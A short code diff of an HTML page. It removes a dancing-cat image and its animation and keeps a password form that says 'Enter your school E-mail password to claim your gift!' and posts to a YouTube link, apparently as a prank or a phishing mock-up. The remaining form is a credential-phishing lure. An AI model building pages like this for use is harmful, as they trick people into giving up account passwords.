@@ -9,7 +9,6 @@
             font-family: Arial, sans-serif;
             height: 100vh;
             display: flex;
-            flex-direction: column;
             justify-content: center;
             align-items: center;
             margin: 0;
@@ -20,22 +19,9 @@
             border-radius: 10px;
             text-align: center;
         }
-        .dancing-cat {
-            width: 100px;
-            height: 100px;
-            background-image: url('https://i.pinimg.com/474x/7a/f0/04/7af004703ee797756ba58c0b186fdca9.jpg');
-            background-size: cover;
-            margin: 20px 0;
-            animation: dance 2s infinite;
-        }
-        @keyframes dance {
-            0%, 100% { transform: rotate(0deg); }
-            50% { transform: rotate(10deg); }
-        }
     </style>
 </head>
 <body>
-    <div class="dancing-cat"></div>
     <form action="https://www.youtube.com/watch?v=xvFZjo5PgG0" method="POST">
         <label for="password">Enter your school E-mail password to claim your gift!</label><br>
         <input type="password" id="password" name="password" required>
